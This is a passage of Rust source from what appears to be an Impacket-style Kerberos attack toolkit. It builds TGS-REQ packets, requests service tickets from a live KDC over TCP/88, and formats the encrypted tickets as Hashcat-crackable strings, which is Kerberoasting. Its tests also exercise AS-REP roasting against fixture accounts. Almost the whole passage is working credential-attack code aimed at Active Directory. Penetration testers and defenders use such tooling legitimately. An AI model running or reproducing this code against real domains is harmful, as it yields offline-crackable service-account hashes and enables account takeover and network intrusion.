                Err(CoreError::ProtocolError(format!("Cannot extract TGT session from KDC error: {}", error_code.name())))
            }
        }
    }
}

/// Result of a Kerberos Service Ticket (TGS-REP) request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TgsRepTicket {
    pub realm: String,
    pub username: String,
    pub sname: Vec<String>,
    pub spn: String,
    pub etype: i32,
    pub cipher: Vec<u8>,
}

impl TgsRepTicket {
    /// Formats the encrypted ticket as a Hashcat roastable string.
    /// EType 23 -> Hashcat -m 13100: `$krb5tgs$23$*<user>$<realm>$<spn>*$<checksum>$<ciphertext>`
    /// EType 17/18 -> Hashcat -m 19600/19700: `$krb5tgs$<etype>$<user>$<realm>$*<spn>*$<checksum>$<ciphertext>`
    pub fn to_hashcat_format(&self) -> Option<String> {
        let spn_clean = self.spn.replace(':', "~");
        if self.etype == 23 {
            if self.cipher.len() < 16 {
                return None;
            }
            let checksum = encode_hex(&self.cipher[..16]);
            let ciphertext = encode_hex(&self.cipher[16..]);
            Some(format!(
                "$krb5tgs$23$*{}${}${}*${}${}",
                self.username, self.realm, spn_clean, checksum, ciphertext
            ))
        } else if self.etype == 18 || self.etype == 17 {
            if self.cipher.len() < 12 {
                return None;
            }
            let checksum_start = self.cipher.len() - 12;
            let checksum = encode_hex(&self.cipher[checksum_start..]);
            let ciphertext = encode_hex(&self.cipher[..checksum_start]);
            Some(format!(
                "$krb5tgs${}${}${}$*{}*${}${}",
                self.etype, self.username, self.realm, spn_clean, checksum, ciphertext
            ))
        } else {
            None
        }
    }
}

/// Builds an RFC 4120 `TGS-REQ` PDU (Application 12) with a length prefix.
pub fn build_tgs_req_der(
    tgt: &TgtSession,
    target_spn: &str,
    nonce: u32,
    now_unix: i64,
) -> Vec<u8> {
    // 1. Authenticator (Application 2)
    let cname = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(1)),
        der::encode_context_explicit(1, &der::encode_sequence(&[der::encode_general_string(&tgt.username)])),
    ]);
    let auth_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(5)),
        der::encode_context_explicit(1, &der::encode_general_string(&tgt.realm)),
        der::encode_context_explicit(2, &cname),
        der::encode_context_explicit(4, &der::encode_integer(0)),
        der::encode_context_explicit(5, &der::encode_generalized_time(&crypto::unix_to_kerberos_time(now_unix))),
    ]);
    let auth_der = der::encode_application(2, &auth_seq);

    // 2. Encrypted Authenticator with TGT session key (Key usage 7: AP-REQ Authenticator)
    let mut confounder = [0u8; 8];
    confounder[0..4].copy_from_slice(&nonce.to_le_bytes());
    confounder[4..8].copy_from_slice(&(now_unix as u32).to_le_bytes());
    let enc_auth = crypto::rc4_hmac_encrypt(&tgt.session_key, 7, &auth_der, &confounder);
    let enc_auth_data = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(23)),
        der::encode_context_explicit(2, &der::encode_octet_string(&enc_auth)),
    ]);

    // 3. AP-REQ (Application 14)
    let ap_req_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(5)),
        der::encode_context_explicit(1, &der::encode_integer(14)),
        der::encode_context_explicit(2, &der::encode_bit_string_u32(0)),
        der::encode_context_explicit(3, &tgt.tgt_ticket),
        der::encode_context_explicit(4, &enc_auth_data),
    ]);
    let ap_req = der::encode_application(14, &ap_req_seq);

    // 4. PA-DATA
    let pa_data = der::encode_sequence(&[
        der::encode_context_explicit(1, &der::encode_integer(1)), // PA-TGS-REQ
        der::encode_context_explicit(2, &der::encode_octet_string(&ap_req)),
    ]);

    // 5. Target SPN
    let (name_type, comps): (i64, Vec<&str>) = if target_spn.contains('/') {
        (2, target_spn.split('/').collect())
    } else {
        (1, vec![target_spn])
    };
    let sname = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(name_type)),
        der::encode_context_explicit(
            1,
            &der::encode_sequence(&comps.iter().map(|s| der::encode_general_string(s)).collect::<Vec<_>>()),
        ),
    ]);

    // 6. KDC-REQ-BODY
    let req_body = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_bit_string_u32(0x4081_0010)),
        der::encode_context_explicit(2, &der::encode_general_string(&tgt.realm)),
        der::encode_context_explicit(3, &sname),
        der::encode_context_explicit(
            5,
            &der::encode_generalized_time(&crypto::unix_to_kerberos_time(now_unix + 86400)),
        ),
        der::encode_context_explicit(7, &der::encode_integer(nonce as i64)),
        der::encode_context_explicit(
            8,
            &der::encode_sequence(&[
                der::encode_integer(23),
                der::encode_integer(18),
                der::encode_integer(17),
            ]),
        ),
    ]);

    // 7. TGS-REQ (Application 12)
    let tgs_seq = der::encode_sequence(&[
        der::encode_context_explicit(1, &der::encode_integer(5)),
        der::encode_context_explicit(2, &der::encode_integer(12)),
        der::encode_context_explicit(3, &der::encode_sequence(&[pa_data])),
        der::encode_context_explicit(4, &req_body),
    ]);
    let app12 = der::encode_application(12, &tgs_seq);
    let mut out = Vec::with_capacity(4 + app12.len());
    out.extend_from_slice(&(app12.len() as u32).to_be_bytes());
    out.extend_from_slice(&app12);
    out
}

/// Parses a raw DER `TGS-REP` (Application 13) or `KRB-ERROR` into a `TgsRepTicket`.
pub fn parse_tgs_rep_der(data: &[u8], target_spn: &str) -> Result<TgsRepTicket, CoreError> {
    let (app_tag, app_body, _) = der::decode_tlv(data)?;
    if app_tag == 0x7E {
        let (_, mut seq_body, _) = der::decode_tlv(app_body)?;
        let mut err_code = 0u32;
        while !seq_body.is_empty() {
            let (ctx_tag, ctx_val, rest) = der::decode_tlv(seq_body)?;
            seq_body = rest;
            if (ctx_tag & 0x1F) == 6 {
                err_code = der::decode_integer(ctx_val)? as u32;
            }
        }
        return Err(CoreError::ProtocolError(format!("KDC error: {}", KrbErrorCode(err_code).name())));
    }

    if app_tag != 0x6D {
        return Err(CoreError::ProtocolError(format!("Expected TGS-REP (0x6D), got 0x{:02X}", app_tag)));
    }

    let (_, mut seq_body, _) = der::decode_tlv(app_body)?;
    let mut realm = String::new();
    let mut username = String::new();
    let mut sname = Vec::new();
    let mut etype = 23i32;
    let mut cipher = Vec::new();

    while !seq_body.is_empty() {
        let (ctx_tag, ctx_val, rest) = der::decode_tlv(seq_body)?;
        seq_body = rest;
        match ctx_tag & 0x1F {
            3 => {
                let (_, s_bytes, _) = der::decode_tlv(ctx_val)?;
                realm = String::from_utf8_lossy(s_bytes).into_owned();
            }
            4 => {
                let (_, c_seq, _) = der::decode_tlv(ctx_val)?;
                let mut c_rem = c_seq;
                while !c_rem.is_empty() {
                    let (ctag, cval, next_c) = der::decode_tlv(c_rem)?;
                    c_rem = next_c;
                    if (ctag & 0x1F) == 1 {
                        let (_, names_seq, _) = der::decode_tlv(cval)?;
                        if let Ok((_, first_name, _)) = der::decode_tlv(names_seq) {
                            username = String::from_utf8_lossy(first_name).into_owned();
                        }
                    }
                }
            }
            5 => {
                let (_, tkt_body, _) = der::decode_tlv(ctx_val)?;
                let (_, mut tkt_seq, _) = der::decode_tlv(tkt_body)?;
                while !tkt_seq.is_empty() {
                    let (ttag, tval, trests) = der::decode_tlv(tkt_seq)?;
                    tkt_seq = trests;
                    match ttag & 0x1F {
                        1 => {
                            let (_, r_bytes, _) = der::decode_tlv(tval)?;
                            if realm.is_empty() {
                                realm = String::from_utf8_lossy(r_bytes).into_owned();
                            }
                        }
                        2 => {
                            let (_, s_seq, _) = der::decode_tlv(tval)?;
                            let mut s_rem = s_seq;
                            while !s_rem.is_empty() {
                                let (stag, sval, next_s) = der::decode_tlv(s_rem)?;
                                s_rem = next_s;
                                if (stag & 0x1F) == 1 {
                                    let (_, names_seq, _) = der::decode_tlv(sval)?;
                                    let mut n_rem = names_seq;
                                    while !n_rem.is_empty() {
                                        let (_, nval, next_n) = der::decode_tlv(n_rem)?;
                                        sname.push(String::from_utf8_lossy(nval).into_owned());
                                        n_rem = next_n;
                                    }
                                }
                            }
                        }
                        3 => {
                            let (_, mut enc_seq, _) = der::decode_tlv(tval)?;
                            while !enc_seq.is_empty() {
                                let (etag, eval, erest) = der::decode_tlv(enc_seq)?;
                                enc_seq = erest;
                                match etag & 0x1F {
                                    0 => etype = der::decode_integer(eval)? as i32,
                                    2 => {
                                        let (_, octets, _) = der::decode_tlv(eval)?;
                                        cipher = octets.to_vec();
                                    }
                                    _ => {}
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
            _ => {}
        }
    }

    if username.is_empty() {
        username = target_spn.split('/').next().unwrap_or(target_spn).to_string();
    }

    Ok(TgsRepTicket {
        realm,
        username,
        sname,
        spn: target_spn.to_string(),
        etype,
        cipher,
    })
}

/// Connects to a live KDC (TCP/88) and requests a Service Ticket (TGS) for `target_spn`.
pub fn request_tgs_live(
    kdc_host: &str,
    kdc_port: u16,
    tgt: &TgtSession,
    target_spn: &str,
    timeout: Duration,
) -> Result<TgsRepTicket, CoreError> {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let nonce = (now as u32) ^ 0xDEAD_BEEF;

    let req_bytes = build_tgs_req_der(tgt, target_spn, nonce, now);

    let addr_str = format!("{}:{}", kdc_host, kdc_port);
    let sock_addr: SocketAddr = addr_str
        .to_socket_addrs()
        .map_err(|e| CoreError::ProtocolError(format!("Failed resolving KDC {}: {}", addr_str, e)))?
        .next()
        .ok_or_else(|| CoreError::ProtocolError(format!("No address found for KDC {}", addr_str)))?;

    let stream = TcpStream::connect_timeout(&sock_addr, timeout)
        .map_err(|e| CoreError::ProtocolError(format!("TCP connect to KDC {} failed: {}", addr_str, e)))?;
    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));
    let mut rx = stream
        .try_clone()
        .map_err(|e| CoreError::ProtocolError(format!("Socket clone failed: {}", e)))?;
    let mut tx = stream;

    tx.write_all(&req_bytes)
        .map_err(|e| CoreError::ProtocolError(format!("Failed sending TGS-REQ: {}", e)))?;

    let mut len_buf = [0u8; 4];
    rx.read_exact(&mut len_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC TCP length prefix: {}", e)))?;
    let msg_len = u32::from_be_bytes(len_buf) as usize;
    if msg_len > 4 * 1024 * 1024 {
        return Err(CoreError::ProtocolError("Oversized Kerberos TCP reply".into()));
    }
    let mut der_buf = vec![0u8; msg_len];
    rx.read_exact(&mut der_buf)
        .map_err(|e| CoreError::ProtocolError(format!("Failed reading KDC reply body: {}", e)))?;

    parse_tgs_rep_der(&der_buf, target_spn)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    /// Test fixture: drives the real `get_np_users_over_stream` client against prebuilt (valid DER)
    /// `AS-REP` and `KRB-ERROR` responses — one roastable account, one requiring pre-auth.
    fn run_get_np_users_against_fixture() -> Result<(KdcAsResponse, KdcAsResponse), CoreError> {
        let cipher: Vec<u8> = (0..48).map(|i| (i * 7 + 3) as u8).collect();
        let rep_bytes =
            KdcAsResponse::build_as_rep_der("CONTOSO.LOCAL", "svc_backup", 23, &cipher, true);
        let mut rx1 = Cursor::new(rep_bytes);
        let mut tx1 = Vec::new();
        let roast_resp = get_np_users_over_stream(
            "CONTOSO.LOCAL",
            "svc_backup",
            AdCompatProfile::UniversalAuto,
            &mut rx1,
            &mut tx1,
        )?;

        let err_bytes = KdcAsResponse::build_krb_error_der(
            KrbErrorCode::KDC_ERR_PREAUTH_REQUIRED,
            "CONTOSO.LOCAL",
            true,
        );
        let mut rx2 = Cursor::new(err_bytes);
        let mut tx2 = Vec::new();
        let preauth_resp = get_np_users_over_stream(
            "CONTOSO.LOCAL",
            "Administrator",
            AdCompatProfile::UniversalAuto,
            &mut rx2,
            &mut tx2,
        )?;

        Ok((roast_resp, preauth_resp))
    }

    #[test]
    fn test_get_np_users_roast_and_preauth_exchange() {
        let (roast_resp, err_resp) =
            run_get_np_users_against_fixture().expect("GetNPUsers exchange should succeed");

        let hashcat = roast_resp
            .to_hashcat_format()
            .expect("should format Hashcat 18200");
        assert!(hashcat.starts_with("$krb5asrep$23$svc_backup@CONTOSO.LOCAL:"));

        assert_eq!(
            err_resp,
            KdcAsResponse::Error {
                error_code: KrbErrorCode::KDC_ERR_PREAUTH_REQUIRED,
                realm: Some("CONTOSO.LOCAL".into()),
            }
        );
    }

    #[test]
    fn test_get_tgt_preauth_request_and_asrep_parse() {
        // The preauth AS-REQ must encode cleanly and carry a PA-ENC-TIMESTAMP padata.
        let nt_hash = [0x31u8; 16];
        let req = Krb5AsReq::with_rc4_preauth("CONTOSO.LOCAL", "svc_backup", &nt_hash, 1_762_300_800);
        assert!(req.pa_enc_timestamp.is_some());
        let der = req.to_der_bytes(false);
        // Application tag 10 (AS-REQ) => 0x6A.
        assert_eq!(der[0], 0x6A);

        // Drive get_tgt_over_stream against a prebuilt AS-REP fixture.
        let rep = KdcAsResponse::build_as_rep_der("CONTOSO.LOCAL", "svc_backup", 23, &[7u8; 40], true);
        let mut rx = Cursor::new(rep);
        let mut tx = Vec::new();
        let resp =
            get_tgt_over_stream("CONTOSO.LOCAL", "svc_backup", &nt_hash, 1_762_300_800, &mut rx, &mut tx)
                .unwrap();
        matches!(resp, KdcAsResponse::AsRep { .. });
    }

    #[test]
    fn test_as_req_aes_and_pkinit_preauth() {
        // AES-256 preauth AS-REQ
        let aes256_key = [0x55u8; 32];
        let req_aes = Krb5AsReq::with_aes256_preauth("CORP.LOCAL", "alice", &aes256_key, 1_700_000_000).unwrap();
        assert!(req_aes.pa_enc_timestamp.is_some());
        let der_aes = req_aes.to_der_bytes(true);
        assert_eq!(der_aes[4], 0x6A); // AS-REQ application tag

        // PKINIT preauth AS-REQ
        let dh = PkinitDhState::new_group14(&[0x77u8; 32]).unwrap();
        let mut mod_bytes = [0xFFu8; 64];
        mod_bytes[0] = 0xC0; // Ensure top bits set for 512-bit
        let priv_bytes = [0x03u8; 64];
        let cred = PkinitCredentials {
            certificate_der: vec![0x30, 0x0A, 0x02, 0x01, 0x01, 0x02, 0x05, 0x01, 0x02, 0x03, 0x04, 0x05],
            issuer_raw: vec![0x30, 0x03, 0x02, 0x01, 0x01],
            serial_number_raw: vec![0x02, 0x01, 0x01],
            rsa_modulus: impacket_crypto::BigUint::from_be_bytes(&mod_bytes),
            rsa_private_exponent: impacket_crypto::BigUint::from_be_bytes(&priv_bytes),
        };
        let req_pk = Krb5AsReq::with_pkinit_preauth("CORP.LOCAL", "alice", &cred, &dh, 1_700_000_000).unwrap();
        assert!(req_pk.pa_enc_timestamp.is_some());
        let der_pk = req_pk.to_der_bytes(false);
        assert_eq!(der_pk[0], 0x6A);
    }
}
